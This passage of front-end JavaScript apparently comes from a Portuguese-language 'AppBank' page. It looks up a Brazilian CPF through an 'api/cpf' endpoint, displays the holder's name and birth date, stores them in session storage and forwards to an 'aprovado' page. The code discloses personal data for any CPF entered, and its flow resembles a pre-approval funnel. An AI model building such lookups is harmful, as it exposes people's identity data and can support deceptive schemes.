    <script>
        (function () {
            var overlay = document.getElementById('ml-modal-overlay');
            var btnClose = document.getElementById('ml-modal-close');
            function hideMlModal() {
                overlay.classList.remove('is-open');
                overlay.setAttribute('aria-hidden', 'true');
            }
            function showMlModal(title, message) {
                document.getElementById('ml-modal-title').textContent = title;
                document.getElementById('ml-modal-message').textContent = message;
                overlay.classList.add('is-open');
                overlay.setAttribute('aria-hidden', 'false');
                btnClose.focus();
            }
            btnClose.addEventListener('click', hideMlModal);
            overlay.addEventListener('click', function (e) {
                if (e.target === overlay) hideMlModal();
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape' && overlay.classList.contains('is-open')) hideMlModal();
            });
            window.showMlModal = showMlModal;
        })();

        function getUrlParams() {
            const params = {};
            const queryString = window.location.search;
            const urlParams = new URLSearchParams(queryString);
            
            for (const [key, value] of urlParams) {
                params[key] = value;
            }
            return params;
        }

        function buildUrlWithParams(baseUrl) {
            const params = getUrlParams();
            const url = new URL(baseUrl, window.location.href);
            
            Object.keys(params).forEach(key => {
                url.searchParams.append(key, params[key]);
            });
            
            return url.toString();
        }

        const MODO_SIMULACAO = false;

        document.getElementById('cpf').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                e.target.value = value;
            }
        });

        async function consultarCPF(cpf) {
            const cpfLimpo = cpf.replace(/[^\d]/g, '');

            if (cpfLimpo.length !== 11) {
                                throw new Error('CPF inválido: deve conter 11 dígitos');
            }

            if (MODO_SIMULACAO) {
                return {
                    nome: 'Cliente de Simulação',
                    data_nascimento: '01/01/1990'
                };
            }

                        const apiUrl = new URL('api/cpf', window.location.href);
                        apiUrl.searchParams.set('cpf', cpfLimpo);

                        const response = await fetch(apiUrl.toString());

                        let data;
            try {
                data = await response.json();
            } catch (parseErr) {
                                throw new Error('Não foi possível processar a resposta. Tente novamente em instantes.');
            }

                                                if (!response.ok || data.ok === false || data.success === false) {
                                                                throw new Error(data.error || 'CPF não encontrado');
            }

                        const result = data.data || data.result || data;
            const out = {
                                nome: result.nome || result.name || 'Nome não disponível',
                                data_nascimento: result.nascimento || result.data_nascimento || result.birth_date || 'Data não disponível'
            };
                        return out;
        }

        document.getElementById('continuar-btn').addEventListener('click', async function () {
            const cpf = document.getElementById('cpf').value;
            const cpfLimpo = cpf.replace(/[^\d]/g, '');

            if (cpf.length < 14) {
                showMlModal('CPF inválido', 'Informe os 11 dígitos do CPF no formato completo.');
                return;
            }

            document.getElementById('form-screen').classList.add('hidden');
            document.getElementById('loading-screen').classList.remove('hidden');

            try {
                                const userData = await consultarCPF(cpf);

                if (userData && userData.nome) {
                    document.getElementById('loading-screen').classList.add('hidden');
                    document.getElementById('success-screen').classList.remove('hidden');

                    document.getElementById('user-name').textContent = userData.nome;
                    document.getElementById('user-birth').textContent = userData.data_nascimento;
                    lastConsultData = { cpf: cpfLimpo, nome: userData.nome, data_nascimento: userData.data_nascimento };
                } else {
                    document.getElementById('loading-screen').classList.add('hidden');
                    document.getElementById('form-screen').classList.remove('hidden');
                    showMlModal('CPF não encontrado', 'Não localizamos este CPF. Confira os números e tente de novo.');
                }
            } catch (error) {
                                document.getElementById('loading-screen').classList.add('hidden');
                document.getElementById('form-screen').classList.remove('hidden');
                showMlModal('Não foi possível consultar', error && error.message ? error.message : 'Tente novamente em instantes.');
            }
        });

        document.getElementById('continuar-final').addEventListener('click', function () {
            try {
                var prev = sessionStorage.getItem('AppBank_user_data');
                var base = prev ? JSON.parse(prev) : {};
                if (lastConsultData.cpf) {
                    base.cpf = lastConsultData.cpf;
                    base.nome = lastConsultData.nome;
                    base.data_nascimento = lastConsultData.data_nascimento;
                    sessionStorage.setItem('AppBank_user_data', JSON.stringify(base));
                }
                            } catch (e) {
                            }
            var dest = typeof buildUrlWithParams === 'function' ? buildUrlWithParams('03-aprovado.html') : '03-aprovado.html';
